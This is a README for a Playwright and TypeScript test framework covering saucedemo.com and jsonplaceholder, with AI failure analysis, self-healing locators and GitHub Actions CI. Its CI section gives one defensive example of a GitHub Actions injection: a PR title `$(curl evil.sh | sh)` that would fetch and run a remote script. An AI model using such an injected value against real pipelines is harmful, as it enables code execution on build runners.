# Saucedemo — Playwright Test Automation Framework

A production-style test automation framework built with Playwright and TypeScript,
covering UI end-to-end tests for [saucedemo.com](https://www.saucedemo.com)
and REST API tests for [jsonplaceholder.typicode.com](https://jsonplaceholder.typicode.com).

---

## 📋 Table of Contents

- [Tech Stack](#-tech-stack)
- [Project Structure](#-project-structure)
- [Architecture Principles](#-architecture-principles)
- [Getting Started](#-getting-started)
- [Running Tests](#-running-tests)
- [AI Failure Analysis](#-ai-failure-analysis)
- [Self-Healing Audit Trail](#-self-healing-audit-trail)
- [AI Test Generation](#-ai-test-generation)
- [Risk Analysis & Impact-Based Test Selection](#-risk-analysis--impact-based-test-selection)
- [CI/CD — GitHub Actions](#-cicd--github-actions)
- [Reporting](#-reporting)
- [Test Users](#-test-users-saucedemo)
- [API Reference](#-api-reference-jsonplaceholder)

---

## 🛠 Tech Stack

| Tool | Version | Purpose |
| --- | --- | --- |
| [Playwright](https://playwright.dev) | ^1.61.0 | Browser automation + API testing |
| [TypeScript](https://www.typescriptlang.org) | ^5.x | Type-safe test code |
| [@faker-js/faker](https://fakerjs.dev) | ^8.4.1 | Test data generation |
| [Allure Playwright](https://allurereport.org) | ^3.10.2 | Test reporting |
| [ESLint](https://eslint.org) + [typescript-eslint](https://typescript-eslint.io) | ^10.x / ^8.x | Lint — required check in CI, run before every push |
| [GitHub Actions](https://github.com/features/actions) | — | CI/CD pipeline |
| [Docker](https://www.docker.com) | — | Consistent browser environment in CI |
| [Groq API](https://console.groq.com) | — | AI-powered failure analysis |

---

## 📁 Project Structure

```
project/
│
├── tests/
│   ├── pages/                       ← Page Objects (one class = one file)
│   │   ├── basePage.ts                 Abstract base: goto(), waitForPageLoad(), getTextOf()
│   │   ├── loginPage.ts                Login form
│   │   ├── inventoryPage.ts            Product catalog
│   │   ├── cartPage.ts                 Shopping cart
│   │   ├── checkoutPage.ts             Checkout flow (3 steps)
│   │   └── index.ts                    Barrel export
│   │
│   ├── fixtures/                    ← Fixtures (one file = one responsibility)
│   │   ├── auth.fixture.ts             standardPage, problemPage via localStorage
│   │   ├── api.fixture.ts              APIRequestContext for jsonplaceholder.typicode.com
│   │   ├── pages.fixture.ts            Page Objects as fixtures (depends on auth)
│   │   ├── healing.fixture.ts          Self-healing heal() fixture (Groq)
│   │   └── index.ts                    mergeTests → export { test, expect }
│   │
│   ├── builders/                    ← Data Builders (faker under the hood)
│   │   ├── shippingInfo.builder.ts     Checkout form data with fluent API
│   │   ├── post.builder.ts             /posts endpoint request data
│   │   └── index.ts                    Barrel export
│   │
│   ├── types/                       ← TypeScript types
│   │   └── api.types.ts                Post, Comment, User, Todo
│   │
│   ├── .auth/                       ← storageState files (.gitignore)
│   │
│   └── specs/                       ← Tests organized by feature
│       ├── auth.setup.ts               Global setup — saves storageState to .auth/
│       ├── features/                   UI tests (project: sd-e2e)
│       │   ├── login.spec.ts
│       │   ├── inventory.spec.ts
│       │   ├── inventory.healing.spec.ts  Self-healing locator demo
│       │   ├── cart.spec.ts
│       │   └── checkout.spec.ts
│       └── api/                        API tests (project: jp-api)
│           └── api.spec.ts
│
├── helpers/                         ← Logic behind scripts/ (one module = one responsibility)
│   ├── groq/                           Groq API client + every prompt builder
│   │   ├── client.ts
│   │   └── prompts/                    failureAnalysis · selfHealing · riskAnalysis · generateTests
│   ├── analyzeFailure/                 Collect → dedupe/cache → analyze → report
│   ├── generateTests/                  Feature description → generated spec file (prompt lives in groq/prompts/)
│   ├── selfHealing/                    Locator failed → AI picks alternative from DOM snapshot
│   │   ├── core.ts                        heal() — logs + Allure-tags every attempt (see log.ts/reporter.ts)
│   │   ├── log.ts                         JSONL log of every healing attempt (test-results/self-healing-log.jsonl)
│   │   └── reporter.ts                    JSONL → self-healing-summary.md
│   ├── riskAnalysis/                   Diff + impacted specs → Groq risk report
│   ├── testSelection/                  Static import graph → impacted specs (no AI)
│   └── git/                            git diff helper shared by risk/selection scripts
│
├── scripts/                         ← CLI entry points (thin wrappers around helpers/)
│   ├── analyzeFailure.ts               AI root-cause analysis of failed tests (ai:analyze)
│   ├── generateTests.ts                AI test-case generation (ai:generate)
│   ├── analyzeRisk.ts                  AI pre-merge risk analysis (ai:risk)
│   ├── selectTests.ts                  Impact-based regression selection (ai:select)
│   └── summarizeHealing.ts             Self-healing audit report (healing:summary)
│
├── .github/
│   ├── workflows/
│   │   ├── pr-checks.yml               on: pull_request — lint/test-e2e/test-api/risk-analysis
│   │   └── on-merge.yml                on: push to main — publish-allure/notify-telegram, no re-test
│   └── scripts/                        Notification/cleanup logic — kept out of the YAML
│       ├── notify-telegram.sh             Untrusted values arrive via env, never spliced into the script
│       ├── find-pr-run.js                 push → the PR run that already tested this code
│       ├── cleanup-artifacts.js
│       └── runRegression.sh               npm run regression — local, no CI trigger involved
├── eslint.config.mjs                ← flat config, no-semicolons house style (npm run lint)
├── playwright.config.ts
├── package.json
└── .gitignore
```

---

## 🏗 Architecture Principles

### 1. Locators live only in Page Objects

```ts
// ❌ Never — locator in a test
await page.locator('[data-test="add-to-cart-sauce-labs-backpack"]').click()

// ✅ Always — method from Page Object
await inventoryPage.addToCart('sauce-labs-backpack')
```

### 2. Fixtures do not contain assertions

```ts
// ❌ Wrong — expect() inside a fixture
inventoryPage: async ({ standardPage }, use) => {
  await expect(standardPage.locator('.inventory_list')).toBeVisible()
  await use(new InventoryPage(standardPage))
}

// ✅ Correct — only setup, no assertions
inventoryPage: async ({ standardPage }, use) => {
  const ip = new InventoryPage(standardPage)
  await ip.inventoryList.waitFor({ state: 'visible' })
  await use(ip)
}
```

### 3. Single import in every test file

```ts
// ✅ Always import from one place
import { test, expect } from '../../fixtures'
```

### 4. Data Builders instead of hardcoded values

```ts
// ❌ Fragile — breaks if field names change
{ firstName: 'John', lastName: 'Doe', postalCode: '12345' }

// ✅ Flexible — random data, override only what matters
new ShippingInfoBuilder().build()
new ShippingInfoBuilder().withEmptyFirstName().build()
new PostBuilder().withUserId(1).build()
```

### 5. No dynamic imports

```ts
// ❌ Breaks with "module": "commonjs" in tsconfig
const { CartPage } = await import('../../pages')

// ✅ Static import at the top of the file
import { CartPage, CheckoutPage } from '../../pages'
```

### 6. No semicolons

```ts
// ❌ semi: ['error', 'never'] — fails lint
const total = await checkoutPage.getSummaryTotal();

// ✅
const total = await checkoutPage.getSummaryTotal()
```

Enforced by ESLint (`npm run lint`), not just convention — see
[eslint.config.mjs](eslint.config.mjs). Required check in CI.

---

## 🚀 Getting Started

### Prerequisites

- Node.js 18+
- npm 9+

### Installation

```bash
# Clone the repository
git clone https://github.com/your-username/saucedemo-playwright.git
cd saucedemo-playwright

# Install dependencies
npm install

# Install Playwright browsers
npx playwright install chromium
```

### Environment variables

Create a `.env` file in the project root:

```bash
cp .env.example .env
```

```env
# Groq API key for AI failure analysis — free at console.groq.com
GROQ_API_KEY=gsk_...
```

---

## ▶️ Running Tests

```bash
# Run all tests
npm test

# Run only UI tests (saucedemo.com)
npm run test:e2e

# Run only API tests (jsonplaceholder.typicode.com)
npm run test:api

# Interactive UI mode — best for local development
npx playwright test --ui

# Run a specific spec file
npx playwright test specs/features/checkout.spec.ts

# Run tests matching a name pattern
npx playwright test --grep "sorting"

# Debug mode — step through actions
npx playwright test --debug

# Record new tests with Codegen
npx playwright codegen https://www.saucedemo.com
```

---

## 🤖 AI Failure Analysis

When tests fail, the AI script reads `test-results/*/error-context.md`
and sends it to [Groq API](https://console.groq.com) (free, no credit card)
for root cause analysis.

```bash
# Run manually after a test failure
npm run ai:analyze
```

In CI, this runs automatically on failure and outputs a collapsible group
in GitHub Actions logs:

```
▶ AI Analysis: checkout flow — full purchase cycle
  ## Root Cause
  The test expected "Thank you for your order!" but the page never
  reached /checkout-complete.html — the Finish button was not clickable.

  ## Location
  checkout.spec.ts:89 — checkoutPage.finish()

  ## Fix
  1. Wait for finishButton to be visible before clicking
  2. Verify summaryTotal is rendered before proceeding

  ## Code
  await expect(checkoutPage.finishButton).toBeVisible()
  await checkoutPage.finish()
```

---

## 🩹 Self-Healing Audit Trail

A healed test still passes — but it passed on a locator the AI (or the local
fallback) guessed, not the one the Page Object declares. Left unflagged, that
pass is indistinguishable from a normal one in any report, which is a real
risk once humans (manual QA, reviewers) start trusting the report as-is: a
UI change that *should* fail a test can slip through as green if a
plausible-enough element still matches the description.

Every `heal()` call that actually had to recover a locator (not just "checked
and it was fine") is:

- **Logged** to `test-results/self-healing-log.jsonl` — test, description,
  original vs. healed selector, method (`ai` or `fallback`), and whether it
  succeeded at all.
- **Tagged in Allure** — `tag('self-healing')` plus `healed` / `heal-method`
  labels and a `self-healing.json` attachment on the test, so Allure's own
  filters can answer "show me every test that only passed via healing this
  run" without reading logs.

After a run, turn the log into a report:

```bash
npm run healing:summary
```

Output — `self-healing-summary.md`:

```
## ✅ Healed
| Test | Description | Original selector | Via | New selector |
|---|---|---|---|---|
| inventory.healing.spec.ts: ... | Add to cart button for ... | [data-test="btn-add-..."] | ai | [data-test="add-to-cart-..."] |

## ❌ Could not heal
| Test | Description | Original selector |
```

In CI this runs after every E2E shard (`if: always()` — a healed test can
still pass, so this isn't gated on failure), and the artifact is retained
alongside the AI failure-analysis reports. Treat a run with entries here the
same way you'd treat a skipped assertion: not a failure, but a flag that a
Page Object selector has drifted and is due a real fix.

---

## ✨ AI Test Generation

Groq generates a first-draft spec file from a feature description
(`helpers/generateTests/features.ts`). Covers both domains — UI (Page Object
driven) and API (jsonplaceholder) — each with its own prompt context, since
the two need completely different rules (locators/fixtures vs. HTTP client/
response shapes).

```bash
npm run ai:generate              # all features (login, inventory, checkout, api)
npm run ai:generate:login
npm run ai:generate:inventory
npm run ai:generate:checkout
npm run ai:generate:api
```

Output goes to `tests/specs/generated/` — reviewed and run there, separately
from the maintained suite, via two dedicated Playwright projects (not part of
`npm test`):

```bash
npm run test:generated           # UI specs (sd-e2e-generated project)
npm run test:generated:api       # API specs (jp-api-generated project)
```

Treat the output as a draft, not a finished test: it's a fast starting point
for a brand-new feature, or for one targeted test off a `ai-risk-analysis.md`
coverage gap — not a replacement for a hand-designed spec. In this repo the
hand-written `checkout.spec.ts` / `login.spec.ts` are still the reference
quality bar (e.g. they deliberately exercise both the healed and non-healed
path of every interaction, which a generated first draft won't think to do
without being told).

---

## 🎯 Risk Analysis & Impact-Based Test Selection

Two AI-adjacent scripts that run **before** you push, not after a test fails.

### Impact-based test selection (deterministic, no AI)

`scripts/selectTests.ts` builds a static import graph of every spec file
(`tests/pages`, `tests/fixtures`, `tests/builders`, `helpers/*`) and figures out
which specs actually depend on what changed — no LLM call, no guessing.
A CI gate that decides *what to run* needs to be exact, not probabilistic;
that's a job for plain static analysis, not AI.

```bash
npm run ai:select              # compares against origin/main (or uncommitted changes)
npm run ai:select -- main      # explicit base ref
```

Output: the list of impacted specs, a ready-to-run `npx playwright test ...`
command, and `impacted-specs.txt` for CI to consume. Touching shared config
(`playwright.config.ts`, `package.json`, `tsconfig.json`) always triggers a
full regression instead of a partial one.

### Risk analysis (Groq)

`scripts/analyzeRisk.ts` takes the same diff, cross-references it against the
impacted-specs result above, and asks Groq for a **judgment call** the graph
can't make on its own: which changes are actually risky, and which changed
code has *no* spec covering it at all.

```bash
npm run ai:risk                # compares against origin/main (or uncommitted changes)
npm run ai:risk -- main        # explicit base ref
```

Output — `ai-risk-analysis.md`:

```
## Risk Summary
## Affected User Flows
## Regression Risk Areas       (High/Medium/Low, with reasoning)
## Coverage Gaps                ← changed code with no existing test
## Recommended New Test Cases   ← feed straight into `npm run ai:generate`
```

The split is deliberate: **static analysis decides what to run** (fast, exact,
safe to gate CI on), **AI decides what's risky and untested** (fuzzy judgment,
meant for a human to read, not to auto-block a merge on).

### In CI: advisory only, never a gate

On every pull request, a `risk-analysis` job runs `ai:risk` against the PR's
base branch and posts (and keeps updating) the result as a PR comment —
`continue-on-error: true`, so a Groq hiccup never fails the PR. It does **not**
replace the full E2E/API regression, and `ai:select` is *not* wired into CI at
all — deliberately: this repo's fixtures barrel-export everything through one
`tests/fixtures/index.ts`, so most changes already touch 6/7 specs, making
selective test running here save little while risking a silently-skipped
regression. `ai:select` stays a local, pre-push convenience command.

---

## 🔄 CI/CD — GitHub Actions

Tests run once per change, on the PR — **not again** when it merges. The
suite is the expensive part (sharded browsers, Docker); re-running it a
second time for the exact code that was just tested is pure waste, so the
merge reuses the PR run's artifacts instead of re-testing.

This is two separate workflow files, each with its own trigger, rather than
one file with `if: github.event_name == ...` guards scattered through every
job — a job either belongs to the PR pipeline or the merge pipeline, and its
file's trigger is the only place that's decided:

- **[`pr-checks.yml`](.github/workflows/pr-checks.yml)** — `on: pull_request`.
  Runs the actual test suite.
- **[`on-merge.yml`](.github/workflows/on-merge.yml)** — `on: push` to `main`.
  Never re-runs tests; reuses `pr-checks.yml`'s artifacts. Deliberately kept
  on `push` rather than `pull_request: closed` — GitHub's `github-pages`
  environment only allows deploys from a real branch ref
  (`refs/heads/main`); `pull_request` events, even on close, always report
  the ephemeral `refs/pull/N/merge` ref instead and get rejected by that
  protection rule.

### Pipeline overview

```
pr-checks.yml (on: pull_request)            on-merge.yml (on: push to main)
    │                                          │
    ├── lint          → required, seconds      ├── find-pr-run
    │                                          │     └── resolves which
    ├── test-e2e (4 shards, Docker)            │        pr-checks.yml run
    │     └── required — the actual gate       │        tested this exact
    │                                          │        code (any merge
    ├── test-api       → required              │        strategy)
    │                                          │
    ├── risk-analysis  → advisory, never       ├── publish-allure
    │     blocks (continue-on-error)           │     └── downloads THAT run's
    │     └── posted/updated as a PR comment   │        allure-results — no
    │                                          │        fresh test run
    ├── merge-reports                          │     └── GitHub Pages
    │     → single Playwright HTML report      │
    │                                          └── notify-telegram
    └── cleanup                                      → status + Allure link
          → deletes this run's old artifacts            + AI snippet, from
                                                            that same PR run
```

`lint`, `test-e2e` and `test-api` are the required checks — the actual merge
gate. `risk-analysis` is advisory only. `ai:select` is deliberately *not*
wired into CI at all — see [Risk Analysis & Impact-Based Test
Selection](#-risk-analysis--impact-based-test-selection) for why.

If `find-pr-run` can't resolve a PR for the push (e.g. someone pushed to
`main` directly, bypassing review), `publish-allure` and `notify-telegram`
both no-op rather than guess — see
[`find-pr-run.js`](.github/scripts/find-pr-run.js).

Want to run the full suite + Allure + Telegram notification on demand,
outside of any CI trigger? `npm run regression` does exactly that locally —
see [`runRegression.sh`](.github/scripts/runRegression.sh).

Notification and cleanup logic lives in `.github/scripts/`, not inline in the
YAML — `notify-telegram.sh` in particular takes untrusted values (PR title,
etc.) as env vars rather than `${{ }}`-interpolating them into the shell
script text, which is a real GitHub Actions script-injection vector otherwise
(a PR titled `` $(curl evil.sh | sh) `` would execute as shell if spliced in
directly).

### Projects

| Project | Test directory | Base URL |
| --- | --- | --- |
| `setup` | `specs/auth.setup.ts` | saucedemo.com |
| `sd-e2e` | `specs/features/` | saucedemo.com |
| `jp-api` | `specs/api/` | jsonplaceholder.typicode.com |

### CI environment variables

`CI=true` activates in `playwright.config.ts`:
- `headless: true`
- `retries: 2`
- `maxFailures: 10`
- `reporter: blob` (for shard merging)

### Required GitHub Secrets

```
Settings → Secrets and variables → Actions → New repository secret

GROQ_API_KEY        — AI failure analysis (free at console.groq.com)
TELEGRAM_BOT_TOKEN  — Telegram notifications
TELEGRAM_CHAT_ID    — Telegram chat or channel ID
```

### Artifacts

| Artifact | When uploaded | Contents |
| --- | --- | --- |
| `playwright-report-e2e` | Always | Merged HTML report from all shards |
| `allure-results-shard-*` | Always | Raw Allure data per shard |
| `ai-analysis-shard-*` | On failure | AI root cause analysis |
| `test-artifacts-shard-*` | On failure | Screenshots, traces, videos |

---

## 📊 Reporting

### Playwright HTML Report

```bash
npm run report:pw
```

### Allure Report

```bash
# Generate report from allure-results/
npm run allure:gen

# Open the generated report
npm run allure:open

# Generate and open in one command
npm run allure:report
```

In CI, Allure is published to **GitHub Pages** after every run:
```
https://<username>.github.io/<repo>/
```

---

## 👤 Test Users (saucedemo)

All users share the same password: `secret_sauce`

| Username | Behavior |
| --- | --- |
| `standard_user` | Everything works normally |
| `locked_out_user` | Cannot log in — sees lockout error |
| `problem_user` | UI bugs (broken images, wrong sort) |
| `performance_glitch_user` | Login takes ~5 seconds |

---

## 🔌 API Reference (jsonplaceholder)

Base URL: `https://jsonplaceholder.typicode.com/`

> **Note:** All paths are without leading slash — required because `baseURL` ends with `/`.
> `'posts'` resolves to `https://jsonplaceholder.typicode.com/posts` ✅
> `'/posts'` resolves to `https://jsonplaceholder.typicode.com/posts` but loses the base path in some contexts ❌

| Resource | Count | Description |
| --- | --- | --- |
| `posts` | 100 | Posts (userId 1–10) |
| `comments` | 500 | Comments (postId 1–100) |
| `users` | 10 | Users |
| `todos` | 200 | Todos (userId 1–10) |
| `albums` | 100 | Albums (userId 1–10) |

All HTTP methods supported: `GET`, `POST`, `PUT`, `PATCH`, `DELETE`.
Write operations are simulated — data is not persisted.

---

## 📦 Scripts Reference

```bash
# Tests
npm test                      # all projects
npm run test:e2e              # UI tests only
npm run test:api              # API tests only
npm run test:generated        # generated UI specs (review before promoting)
npm run test:generated:api    # generated API specs (review before promoting)

# Lint
npm run lint                  # eslint . — recommended before every push, alongside ai:risk/ai:select

# Reports
npm run report:pw             # open Playwright HTML report
npm run allure:gen            # generate Allure report
npm run allure:open           # open Allure report
npm run allure:report         # generate + open

# AI
npm run ai:analyze            # analyze latest test failures via Groq
npm run ai:risk                # pre-merge risk analysis of the current diff
npm run ai:select              # impact-based test selection (deterministic)
npm run ai:generate            # generate spec files for all features (login, inventory, checkout, api)
npm run ai:generate:api        # generate spec file for the API suite only
npm run healing:summary        # build self-healing-summary.md from this run's healing log
```